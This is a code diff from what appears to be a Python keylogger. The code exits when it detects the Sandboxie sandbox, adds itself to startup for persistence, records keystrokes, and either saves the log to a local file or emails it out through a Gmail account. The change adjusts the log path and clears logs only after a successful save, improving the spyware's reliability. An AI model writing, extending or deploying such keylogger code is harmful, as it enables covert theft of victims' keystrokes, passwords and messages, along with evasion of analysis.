@@ -12,9 +12,6 @@ class main:
         if check_sandboxie and persistence.detect_sandboxie(): sys.exit(0)
         if add_to_startup: persistence.add_to_startup()
 
-        self.tmp = os.environ["TEMP"]
-        self.appdata = os.environ["APPDATA"]
-
         self.gmail = ""
         self.gmail_pass = ""
 
@@ -41,8 +38,8 @@ class main:
 
             if key_log != "":
                 if self.gmail == "":
-                    exporter.save_text_locally(key_log, self.export_path)
-                    self.keylogger.clear_key_log()
+                    if exporter.save_text_locally(key_log, self.export_path):
+                        self.keylogger.clear_key_log()
                 else:
                     if exporter.send_gmail(key_log, self.gmail, self.gmail_pass):
                         self.keylogger.clear_key_log()
@@ -51,7 +48,7 @@ class main:
 if __name__ == "__main__":
     main = main(60, "c:/temp/log.txt")
 
-    # main = main(180)
+    # main = main(180, os.environ["TEMP"] + "/log.txt")
     # main = main(180, "", True, True, True, True)
     # main.override_gmail("email@gmail.com", "pass")
 
